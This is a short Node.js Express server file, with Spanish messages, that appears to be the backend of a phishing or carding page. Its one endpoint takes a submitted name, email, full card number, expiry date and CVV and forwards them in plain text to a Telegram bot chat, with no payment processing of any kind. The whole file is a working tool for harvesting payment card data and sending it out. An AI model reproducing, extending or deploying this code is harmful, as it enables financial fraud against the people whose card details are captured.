// server.js
import express from 'express';
import fetch from 'node-fetch';
import 'dotenv/config'; // Carga las variables de entorno

const app = express();
app.use(express.json());
app.use(express.static('public'));

const TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.post('/send-message', async (req, res) => {
  const { nombre, correo, tarjeta, caducidad, cvv } = req.body;

  if (!nombre || !tarjeta || !caducidad || !cvv) {
    return res.status(400).json({ ok: false, error: 'Faltan campos obligatorios' });
  }

  const mensaje = `
Nuevo formulario recibido:
Nombre: ${nombre}
Correo: ${correo || '(no proporcionado)'}
Tarjeta: ${tarjeta}
Fecha: ${caducidad}
CVV: ${cvv}
  `;

  try {
    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje
      })
    });

    const data = await response.json();

    if (!data.ok) {
      return res.status(500).json({ ok: false, error: 'Error enviando a Telegram' });
    }

    res.json({ ok: true });
  } catch (err) {
    console.error('Error enviando mensaje a Telegram:', err);
    res.status(500).json({ ok: false, error: 'Error interno del servidor' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor escuchando en http://localhost:${PORT}`);
});
